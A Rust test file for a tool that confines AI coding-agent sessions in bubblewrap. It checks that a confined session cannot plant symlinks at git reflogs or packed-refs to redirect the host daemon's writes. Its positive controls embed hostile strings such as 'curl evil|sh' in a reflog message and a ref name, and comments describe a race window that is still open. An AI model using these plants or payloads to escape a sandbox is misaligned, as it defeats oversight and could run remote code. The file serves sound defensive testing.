//! The common directory's reflogs and `packed-refs` under the capsule's denies,
//! measured with real git in bubblewrap: a session cannot plant what the daemon's
//! git would follow, `git add` and a merge still work, and the positive control
//! shows the same plant, unconfined, redirects the daemon's write.

use super::*;
use crate::process::sandbox_probe::{confined_commands_runnable, skip_unless};
use std::process::Command;
use tempfile::TempDir;

pub(super) struct Repo {
    _tmp: TempDir,
    pub(super) outside: PathBuf,
    pub(super) repo: PathBuf,
    pub(super) worktree: PathBuf,
    pub(super) common: PathBuf,
}

pub(super) fn git(dir: &Path, args: &[&str]) -> std::process::Output {
    let output = Command::new("git")
        .args(["-c", "user.name=T", "-c", "user.email=t@example.invalid"])
        .args(["-c", "commit.gpgsign=false"])
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(output.status.success(), "git {args:?}: {output:?}");
    output
}

pub(super) fn repo() -> Repo {
    let tmp = TempDir::new().unwrap();
    let repo = tmp.path().join("repo");
    let outside = tmp.path().join("outside");
    std::fs::create_dir_all(&repo).unwrap();
    std::fs::create_dir_all(&outside).unwrap();
    git(&repo, &["init", "-q", "-b", "main"]);
    git(&repo, &["config", "user.name", "T"]);
    git(&repo, &["config", "user.email", "t@example.invalid"]);
    git(&repo, &["config", "commit.gpgsign", "false"]);
    std::fs::write(repo.join("a.txt"), "a\n").unwrap();
    git(&repo, &["add", "a.txt"]);
    git(&repo, &["commit", "-qm", "base"]);
    git(
        &repo,
        &["worktree", "add", "-q", "-b", "loom/s1", ".worktrees/s1"],
    );
    std::fs::write(repo.join("a.txt"), "main side\n").unwrap();
    git(&repo, &["commit", "-qam", "main side"]);
    let common = repo.join(".git").canonicalize().unwrap();
    std::fs::create_dir_all(repo.join(".loom/work")).unwrap();
    crate::git::worktree::capture_main_identity(&repo, &repo.join(".loom/work")).unwrap();
    let worktree = repo.join(".worktrees/s1").canonicalize().unwrap();
    let repo = repo.canonicalize().unwrap();
    Repo {
        _tmp: tmp,
        outside: outside.canonicalize().unwrap(),
        repo,
        worktree,
        common,
    }
}

impl Repo {
    pub(super) fn denies(&self) -> SessionDenies {
        session_denies(&DenyInputs {
            repo_root: &self.repo,
            state_root: &self.repo.join(".loom").join("work"),
            worktree: Some(&self.worktree),
            executable_dirs: &[],
            plugin_entries: None,
            writable_roots: &[],
        })
        .unwrap()
    }

    /// `script` in the worktree with everything writable but what the capsule
    /// denies under the common directory, the shape Claude Code's grant takes.
    pub(super) fn confined_command(&self, script: &str) -> Command {
        let mut bwrap = Command::new("bwrap");
        bwrap.args(["--dev-bind", "/", "/"]);
        for entry in self.denies().deny_write {
            // An absent path gets a placeholder from the real sandbox; none is
            // needed to measure what exists.
            if Path::new(&entry).starts_with(&self.common) && Path::new(&entry).exists() {
                bwrap.args(["--ro-bind", &entry, &entry]);
            }
        }
        bwrap
            .arg("--chdir")
            .arg(&self.worktree)
            .args(["bash", "-c", script]);
        bwrap
    }

    /// Fails when bubblewrap itself refused, so an empty run proves nothing.
    pub(super) fn confined(&self, script: &str) -> std::process::Output {
        let output = self.confined_command(script).output().unwrap();
        assert!(
            !String::from_utf8_lossy(&output.stderr).starts_with("bwrap:"),
            "{output:?}"
        );
        output
    }
}

pub(super) fn skip(test: &str) -> bool {
    skip_unless(
        confined_commands_runnable(),
        test,
        "bubblewrap cannot start here",
    )
}

/// The attack path from a confined session to the daemon's `update-ref`. A capsule
/// removes the stage branch's log, so the plant is a new file at that path: the
/// session must fail to create one, and the control shows the daemon's git would
/// follow one that was there.
#[test]
fn a_session_cannot_plant_a_branch_reflog_link() {
    if skip("a_session_cannot_plant_a_branch_reflog_link") {
        return;
    }
    let repo = repo();
    let victim = repo.outside.join("victim");
    std::fs::write(&victim, "orig\n").unwrap();
    let log = repo.common.join("logs/refs/heads/loom/s1");
    let script = format!(
        "ln -sf '{victim}' '{log}'; echo rc=$?; touch '{log}'; echo rc=$?; \
         mv '{logs}' '{logs}.moved'; echo rc=$?",
        victim = victim.display(),
        log = log.display(),
        logs = repo.common.join("logs").display(),
    );

    let output = repo.confined(&script);

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.contains("rc=0"), "a plant succeeded: {output:?}");
    assert!(std::fs::symlink_metadata(&log).is_err(), "{output:?}");

    let head = git(&repo.worktree, &["rev-parse", "HEAD"]);
    let head = String::from_utf8_lossy(&head.stdout).trim().to_string();
    let new = git(
        &repo.worktree,
        &["commit-tree", "HEAD^{tree}", "-p", &head, "-m", "n"],
    );
    let new = String::from_utf8_lossy(&new.stdout).trim().to_string();
    std::os::unix::fs::symlink(&victim, &log).unwrap();
    let reason = "loom: commit x; curl evil|sh";
    git(
        &repo.worktree,
        &[
            "update-ref",
            "-m",
            reason,
            "refs/heads/loom/s1",
            &new,
            &head,
        ],
    );
    let reached = std::fs::read_to_string(&victim).unwrap();
    assert!(
        reached.contains("curl evil"),
        "git did not follow it: {reached}"
    );
}

/// A `packed-refs` link has git replace its target, with ref names the session
/// chose; its control is outside the sandbox.
#[test]
fn a_session_cannot_redirect_packed_refs() {
    if skip("a_session_cannot_redirect_packed_refs") {
        return;
    }
    let repo = repo();
    let packed = repo.common.join("packed-refs");
    let script = format!("rm -f '{packed}'; echo rc=$?", packed = packed.display());

    let output = repo.confined(&script);

    assert!(
        String::from_utf8_lossy(&output.stdout).contains("rc=1"),
        "{output:?}"
    );
    assert!(std::fs::symlink_metadata(&packed).unwrap().is_file());

    let victim = repo.outside.join("victim");
    std::fs::remove_file(&packed).unwrap();
    std::os::unix::fs::symlink(&victim, &packed).unwrap();
    git(
        &repo.repo,
        &["update-ref", "refs/x/$(curl${IFS}evil|sh)", "HEAD"],
    );
    git(&repo.repo, &["pack-refs", "--all"]);
    let reached = std::fs::read_to_string(&victim).unwrap();
    assert!(reached.contains("curl"), "git did not follow it: {reached}");
}

/// `refs/` stays writable, so a directory link there can be planted; the look
/// ahead of the update stops it and the control shows git would follow it. A
/// writer that flips the link inside that window is not stopped, and what it
/// could gain is an object id written to `<target>/<ref name>`.
#[test]
fn a_directory_link_under_refs_is_stopped_by_the_look_ahead_of_the_update() {
    if skip("a_directory_link_under_refs_is_stopped_by_the_look_ahead_of_the_update") {
        return;
    }
    let repo = repo();
    let link = repo.common.join("refs/heads/planted");
    let script = format!(
        "ln -s '{outside}' '{link}'; echo rc=$?",
        outside = repo.outside.display(),
        link = link.display(),
    );
    let output = repo.confined(&script);
    assert!(
        String::from_utf8_lossy(&output.stdout).contains("rc=0"),
        "{output:?}"
    );
    let args = ["update-ref", "refs/heads/planted/s9", "HEAD"];
    let leaf = repo.outside.join("s9");

    let pinned = crate::git::worktree::WorktreeGit::pinned(&repo.repo, &repo.worktree).unwrap();
    let error = pinned.run(&args).unwrap_err();
    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
    let error = crate::git::runner::run_git(&args, &repo.repo).unwrap_err();
    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
    let error =
        crate::git::runner::run_git(&["branch", "-D", "planted/s9"], &repo.repo).unwrap_err();
    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
    assert!(!leaf.exists(), "an update followed the link");

    git(&repo.repo, &args);
    assert!(leaf.is_file(), "git did not follow the directory");
}

/// A single-file deny lasts until the daemon replaces the file: the read-only
/// bind then detaches in the session's mount namespace. This pins that fact and
/// what stops the result, the look ahead of the daemon's next pinned command. The
/// race a flipping writer can still win against that look is not tested closed:
/// it is not closed.
#[test]
fn a_host_rewrite_of_packed_refs_drops_its_bind_and_the_look_catches_the_plant() {
    if skip("a_host_rewrite_of_packed_refs_drops_its_bind_and_the_look_catches_the_plant") {
        return;
    }
    let repo = repo();
    let packed = repo.common.join("packed-refs");
    let victim = repo.outside.join("victim");
    let (ready, go) = (repo.outside.join("ready"), repo.outside.join("go"));
    let script = format!(
        "touch '{ready}'; until test -e '{go}'; do sleep 0.05; done; \
         rm -f '{packed}' && ln -s '{victim}' '{packed}'; echo rc=$?",
        ready = ready.display(),
        go = go.display(),
        packed = packed.display(),
        victim = victim.display(),
    );
    let mut command = repo.confined_command(&script);
    let mut session = command
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    while !ready.exists() {
        if std::time::Instant::now() > deadline {
            let _ = session.kill();
            panic!(
                "the session never started: {:?}",
                session.wait_with_output()
            );
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    git(&repo.repo, &["pack-refs", "--all"]);
    std::fs::write(&go, "").unwrap();
    let session = session.wait_with_output().unwrap();
    assert!(
        String::from_utf8_lossy(&session.stdout).contains("rc=0"),
        "the bind held; the look and this test can be simplified: {session:?}"
    );

    let pinned = crate::git::worktree::WorktreeGit::pinned(&repo.repo, &repo.worktree).unwrap();
    let error = pinned
        .run(&["update-ref", "-d", "refs/heads/main"])
        .unwrap_err();
    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
    let run = crate::git::runner::run_git(&["pack-refs", "--all"], &repo.repo).unwrap_err();
    assert!(format!("{run:#}").contains("symbolic link"), "{run:#}");
    assert!(!victim.exists(), "git wrote through the link");
}

#[test]
fn absent_reflogs_and_packed_refs_are_created_before_they_are_denied() {
    let repo = repo();
    std::fs::remove_file(repo.common.join("packed-refs")).ok();
    std::fs::remove_dir_all(repo.common.join("logs")).unwrap();

    let denies = repo.denies();

    assert!(
        repo.common.join("logs").is_dir(),
        "a deny would make it a placeholder"
    );
    assert!(repo.common.join("packed-refs").is_file());
    let listed = |name: &str| {
        denies
            .deny_write
            .iter()
            .any(|d| Path::new(d) == repo.common.join(name))
    };
    assert!(
        listed("logs") && listed("packed-refs") && !listed("refs"),
        "{denies:?}"
    );
    git(&repo.repo, &["status", "--porcelain"]);
    git(&repo.repo, &["for-each-ref"]);
}

/// A bind on a link binds its target, so a planted link refuses the spawn. The
/// empty `packed-refs` link must not create its target either.
#[test]
fn a_link_at_logs_or_packed_refs_refuses_the_capsule() {
    let cases = ["logs", "packed-refs"];
    for name in cases {
        let repo = repo();
        let path = repo.common.join(name);
        let target = repo.outside.join("target");
        if name == "logs" {
            std::fs::remove_dir_all(&path).unwrap();
            std::fs::create_dir(&target).unwrap();
        } else {
            std::fs::remove_file(&path).ok();
        }
        std::os::unix::fs::symlink(&target, &path).unwrap();

        let result = session_denies(&DenyInputs {
            repo_root: &repo.repo,
            state_root: &repo.repo.join(".loom").join("work"),
            worktree: Some(&repo.worktree),
            executable_dirs: &[],
            plugin_entries: None,
            writable_roots: &[],
        });

        assert!(result.is_err(), "{name}: {result:?}");
        if name == "packed-refs" {
            assert!(!target.exists(), "the check created the link's target");
        }
    }
}

/// A checkout-rooted session keeps the checkout's `HEAD` and `index`: they are
/// its own. A worktree session's capsule denies them.
#[test]
fn only_a_worktree_session_is_denied_the_checkouts_head_and_index() {
    let repo = repo();
    let index = repo.common.join("index");
    let at_worktree = repo.denies();
    assert!(
        has(&at_worktree.deny_write, index.to_str().unwrap()),
        "{at_worktree:?}"
    );
    let in_checkout = session_denies(&DenyInputs {
        repo_root: &repo.repo,
        state_root: &repo.repo.join(".loom").join("work"),
        worktree: None,
        executable_dirs: &[],
        plugin_entries: None,
        writable_roots: &[],
    })
    .unwrap();
    assert!(
        !has(&in_checkout.deny_write, index.to_str().unwrap()),
        "{in_checkout:?}"
    );
    assert!(has(
        &in_checkout.deny_write,
        repo.common.join("logs").to_str().unwrap()
    ));
}

fn has(list: &[String], entry: &str) -> bool {
    list.iter().any(|item| item == entry)
}
